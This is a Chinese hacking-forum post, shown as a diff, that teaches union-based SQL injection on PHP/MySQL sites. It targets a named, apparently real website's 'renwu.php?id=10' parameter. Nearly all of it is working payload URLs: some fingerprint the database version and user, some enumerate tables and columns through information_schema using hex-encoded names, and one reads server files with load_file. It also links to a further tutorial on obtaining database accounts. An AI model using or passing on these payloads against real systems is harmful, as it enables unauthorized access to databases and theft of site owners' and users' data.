@@ -1,0 +1,75 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+PHP注入实例 超级详细附带教程
+D8888D主贴内容-------------------------------------------------------
+ 
+
+#################################################################################
+#
+# PHP高级注入实例
+# Home:        [url=http://www.dis9.com]链接标记www.dis9.com[/url]  
+#
+#################################################################################
+
+
+
+
+-----------------------------------系统信息-------------------------------------------
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 1,2,version(),4,5
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 1,2,database(),4,5
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 1,2,user(),4,5
+
+
+--------------------------------爆数据库的表-------------------------------------------------
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 0,0,concat(table_name),0,0 from (select * from (select * from information_schema.tables where table_schema=0x61797363 order by table_schema limit 0,1) t order by table_schema desc)t limit 1--          /0x61797363是爆出的数据库aysc（database()）的16进制 爆出位置0的表 注意从0开始
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 0,0,concat(table_name),0,0 from (select * from (select * from information_schema.tables where table_schema=0x61797363 order by table_schema limit 2,1) t order by table_schema desc)t limit 1--         /爆出位置2的表
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+[url=http://www.52aysc.com/renwu.php?id=10]链接标记http://www.52aysc.com/renwu.php?id=10[/url] and 1=2 union select 0,0,concat(table_name),0,0 from (select * from (select * from information_schema.tables where table_schema=0x61797363 order by table_schema limit 10,1) t order by table_schema desc)t limit 1--         /爆出位置10的表
+
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+-------------------------------爆出字段-------------------------------------------------------------
+[url=http://www.52aysc.com//renwu.php?id=10]链接标记http://www.52aysc.com//renwu.php?id=10[/url] and 1=2 union select 0,0,concat(cast(count(*) as char)),0,0 from information_schema.columns  where table_name=0x6364625f696d6167657479706573 and table_schema=0x61797363 limit 1--     /0x6364625f696d6167657479706573是选择一个表    0x61797363是数据库账户 16进制  
+//爆出含有多少字段
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+
+[url=http://www.52aysc.com//renwu.php?id=10]链接标记http://www.52aysc.com//renwu.php?id=10[/url] and 1=2 union select 0,0,concat(column_name),0,0 from (select * from (select * from information_schema.columns where table_name=0x6364625f696d6167657479706573 and table_schema=0x61797363 order by 1 limit 0,1) t order by 1 desc)t limit 1--
+//爆出数据库账户 0x61797363 中的表 0x6364625f696d6167657479706573 的 0 位置 的字段   （必须转换16进制）
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+[url=http://www.52aysc.com//renwu.php?id=10]链接标记http://www.52aysc.com//renwu.php?id=10[/url] and 1=2 union select 0,0,concat(column_name),0,0 from (select * from (select * from information_schema.columns where table_name=0x6364625f696d6167657479706573 and table_schema=0x61797363 order by 1 limit 1,1) t order by 1 desc)t limit 1--
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+//爆出数据库账户 0x61797363 中的表 0x6364625f696d6167657479706573 的 1 位置 的字段   （必须转换16进制）
+
+-----------------------------爆出数据数据----------------------------------------------------------------
+
+联合查询
+这个哥哥不说了
+
+-----------------------------跨库？得到数据库账户？--------------
+参考我的教程 php注入爆数据库账户
+[url=http://u.115.com/file/f86e56c2cb]链接标记http://u.115.com/file/f86e56c2cb[/url]
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
+
+-----------------------------读数据文件--------------
+/renwu.php?id=10 and 1=2 union select 0,0,concat(load_file(16进制的地址)),0,0 --
+
+
+××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
